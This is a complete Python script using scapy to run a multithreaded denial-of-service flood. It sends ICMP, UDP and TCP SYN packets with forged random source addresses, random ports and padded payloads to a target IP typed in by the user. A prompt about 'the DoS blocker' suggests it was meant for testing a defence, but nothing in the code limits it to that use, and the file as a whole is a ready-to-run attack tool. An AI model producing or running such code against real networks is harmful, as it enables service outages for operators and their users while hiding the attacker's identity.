from scapy.all import IP, ICMP, UDP, TCP, send
import time
import random
from concurrent.futures import ThreadPoolExecutor

# Function to generate random payload size
def generate_payload():
    size = random.randint(512, 2048)  # Random payload size between 512 bytes and 2KB
    return "X" * size  # Create a payload of that size

# Function to send a spoofed packet
def send_packet(target_ip):
    # Spoof the source IP with a random address
    src_ip = ".".join(str(random.randint(0, 255)) for _ in range(4))  # Random source IP
    
    # Randomly choose a protocol: ICMP, UDP, or TCP
    protocol = random.choice(["ICMP", "UDP", "TCP"])

    # Generate random payload size
    payload = generate_payload()

    if protocol == "ICMP":
        packet = IP(src=src_ip, dst=target_ip)/ICMP()/payload
    elif protocol == "UDP":
        packet = IP(src=src_ip, dst=target_ip)/UDP(dport=random.randint(1, 65535))/payload
    elif protocol == "TCP":
        packet = IP(src=src_ip, dst=target_ip)/TCP(dport=random.randint(1, 65535), flags="S")/payload
    
    send(packet, verbose=0)  # Send the packet without verbose output

# Function to flood the network
def flood(target_ip, count, threads):
    """Sends packets in parallel with spoofed IPs and random payloads."""
    with ThreadPoolExecutor(max_workers=threads) as executor:
        for _ in range(count):
            executor.submit(send_packet, target_ip)

if __name__ == "__main__":
    # Get user input for target IP, packet count, and number of threads
    target_ip = input("Enter the target IP address (the one with the DoS blocker): ")
    packet_count = int(input("Enter the number of packets to send: "))
    threads = int(input("Enter the number of threads to use: "))
    
    print(f"Starting flood to {target_ip} with {packet_count} packets using {threads} threads...")
    flood(target_ip, packet_count, threads)
    print("Flooding complete.")
